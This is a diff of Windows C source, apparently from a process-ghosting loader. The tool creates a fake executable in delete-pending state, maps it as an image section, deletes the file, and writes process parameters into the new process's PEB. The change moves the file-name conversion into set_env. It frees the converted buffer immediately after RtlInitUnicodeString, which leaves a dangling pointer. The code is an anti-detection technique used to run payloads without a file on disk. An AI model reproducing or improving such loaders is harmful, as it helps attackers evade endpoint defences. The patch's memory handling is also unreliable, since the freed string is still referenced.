@@ -392,7 +392,8 @@ BOOL write_params_to_peb(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFO
 }
 
 // Assign process arguments and environment variables
-BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
+BOOL set_env(PCP_INFO p_info, LPSTR target_name) {
+	NTSTATUS _status;
 	DWORD ret_len = 0;
 	LPVOID env, param;
 	PEB* peb_copy = NULL;
@@ -403,7 +404,20 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 	UNICODE_STRING u_window_name = { 0 };
 	PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;
 
-	NTSTATUS _status;
+	wchar_t* w_target_name = (wchar_t*)malloc((strlen(target_name) + 1) * 2);
+	if (w_target_name == NULL) {
+		fprintf(stderr, "[!] Failed to allocate memory for Wide File Name\n");
+		return FALSE;
+	}
+
+	RtlZeroMemory(w_target_name, _msize(w_target_name));
+
+	if ((MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, target_name, -1, w_target_name, _msize(w_target_name))) == 0) {
+		fprintf(stderr, "[!] MultiByteToWideChar() failed\n");
+		free(w_target_name);
+		return FALSE;
+	}
+
 	_status = NtQueryInformationProcess(
 		p_info->p_handle,
 		ProcessBasicInformation,
@@ -412,11 +426,13 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 		&ret_len);
 
 	if (!__check_nt_status(_status, "NtQueryInformationProcess()")) {
+		free(w_target_name);
 		return FALSE;
 	}
 
 	// Copy Target Paths
 	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
+	free(w_target_name);
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
 		return FALSE;
 	}
@@ -503,7 +519,6 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 int spawn_process(char* real_exe, char* fake_exe) {
 	DWORD f_size;
 	HANDLE hfakefile, hsection;
-	LPVOID base_addr;
 	PCP_INFO p_info;
 
 	// Create fake executable and put it in delete-pending state
@@ -531,7 +546,7 @@ int spawn_process(char* real_exe, char* fake_exe) {
 	}
 
 	// Get Entry Point of PE image
-	DWORD entry_point = get_ep_rva(f_bytes);
+	DWORD entry_point = get_ep_rva((LPVOID)f_bytes);
 	free(f_bytes);
 
 	printf("> Deleting Fake File\n");
@@ -553,29 +568,11 @@ int spawn_process(char* real_exe, char* fake_exe) {
 	CloseHandle(hsection);
 	printf("==== Assign process arguments and environment variables ====\n");
 
-	wchar_t* w_fname = (wchar_t*)malloc((strlen(fake_exe) + 1) * 2);
-	if (w_fname == NULL) {
-		fprintf(stderr, "[!] Failed to allocate memory for Wide File Name\n");
-		CloseHandle(p_info->p_handle);
-		return -7;
-	}
-
-	RtlZeroMemory(w_fname, _msize(w_fname));
-
-	if ((MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, fake_exe, -1, w_fname, _msize(w_fname))) == 0) {
-		fprintf(stderr, "[!] MultiByteToWideChar() failed\n");
-		free(w_fname);
-		CloseHandle(p_info->p_handle);
-		return -8;
-	}
-
-	if (!set_env(p_info, w_fname)) {
+	if (!set_env(p_info, fake_exe)) {
 		fprintf(stderr, "[!] Failed to set environment variables\n");
-		free(w_fname);
 		CloseHandle(p_info->p_handle);
 		return -9;
 	}
-	free(w_fname);
 	printf("> Set Environment and Proc Args\n");
 
 	PEB* _peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
